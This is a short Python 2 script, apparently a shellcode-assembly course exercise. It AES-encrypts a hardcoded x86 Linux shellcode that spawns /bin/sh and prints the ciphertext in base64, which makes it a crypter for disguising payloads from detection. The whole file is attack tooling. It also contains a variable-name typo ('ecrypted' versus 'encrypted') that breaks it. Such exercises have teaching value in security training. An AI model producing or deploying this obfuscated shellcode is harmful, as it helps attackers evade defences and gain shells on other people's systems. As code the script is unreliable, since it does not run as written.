import base64

from Crypto import Random
from Crypto.Cipher import AES

BLOCK_SIZE = 16
Padding = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = Padding(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )


cipher = AESCipher('SLAEsecuritytube')
ecrypted = cipher.encrypt(shellcode)
print 'Encrypted Shellcode:\n', encrypted # prints Encrypted Shellcode
